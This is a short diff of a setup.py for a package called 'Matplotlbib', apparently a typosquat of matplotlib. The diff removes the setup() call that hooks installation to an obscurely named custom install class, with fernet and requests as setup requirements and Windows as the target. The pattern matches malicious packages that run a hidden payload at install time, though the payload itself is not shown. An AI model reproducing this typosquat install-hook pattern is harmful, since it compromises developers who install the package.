@@ -18,22 +18,5 @@ class DdpDHZvzGHpVLiyLqkdshcnFfEVMTnINCMkfVuTRRaniSscfhJkihNmkCwzvcSUxFTGfWnyrIW
             install.run(self)
 
 
-setup(
-    name="Matplotlbib",
-    version=VERSION,
-    author="GBuPtXPFqUinfnwveSyE",
-    author_email="YIoaD@gmail.com",
-    description=DESCRIPTION,
-    long_description_content_type="text/markdown",
-    long_description=LONG_DESCRIPTION,
-    cmdclass={
-        'install': DdpDHZvzGHpVLiyLqkdshcnFfEVMTnINCMkfVuTRRaniSscfhJkihNmkCwzvcSUxFTGfWnyrIWcsNoKoGRP,
-    },
-    packages=find_packages(),
-    setup_requires=['fernet', 'requests'],
-    keywords=[],
-    classifiers=[
-        "Operating System :: Microsoft :: Windows",
-    ]
-)
+# setup(...) removed                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                   
 
